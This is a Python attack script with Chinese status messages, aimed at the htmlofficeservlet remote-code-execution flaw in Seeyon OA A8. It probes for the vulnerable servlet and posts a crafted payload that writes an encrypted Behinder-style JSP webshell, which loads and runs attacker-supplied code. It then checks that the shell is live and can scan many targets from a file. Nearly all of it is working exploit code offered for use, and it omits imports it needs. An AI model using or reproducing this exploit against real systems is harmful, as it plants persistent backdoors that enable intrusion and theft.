# -*- coding: utf-8 -*-

import time
import requests
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def get_shell(target_url):
    console.print(now_time() + ' [INFO]     开始写入webshell', style='bold blue')
    vuln_url = target_url + "seeyon/htmlofficeservlet"
    payload = '''DBSTEP V3.0     351             0               533             DBSTEP=OKMLlKlV\r
OPTION=S3WYOSWLBSGr\r
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
CREATEDATE=wUghPB3szB3Xwg66\r
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
originalFileId=wV66\r
originalCreateDate=wUghPB3szB3Xwg66\r
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdbHthwalGcRu5nHzs\r
needReadFile=yRWZdAS6\r
originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>6e4f045d4b8506bf492ada7e3390d7ce'''
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.post(vuln_url, headers=headers, data=payload, timeout=5)
        shell_url = target_url + 'seeyon/zz11uunn.jsp'
        response = requests.get(shell_url, timeout=5)
        if response.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  冰蝎三默认webshell写入成功: {}'.format(shell_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  写入webshell失败, 可进行手动检测', style='bold yellow')
    except:
        console.print(now_time() + ' [WARNING]  写入webshell失败', style='bold yellow')


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "seeyon/htmlofficeservlet"
    console.print(now_time() + " [INFO]     正在检测致远OA A8 htmlofficeservlet RCE漏洞", style='bold blue')
    #console.print(now_time() + " [INFO]     正在请求 {}".format(vuln_url), style='bold blue')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    requests.packages.urllib3.disable_warnings()
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'htmoffice' in response.text:
            console.print(now_time() + " [INFO]     检测存在 htmlofficeservlet 页面 " + vuln_url, style='bold blue')
            get_shell(target_url)
        else:
            console.print(now_time() + " [WARNING]  不存在 htmlofficeservlet 页面", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
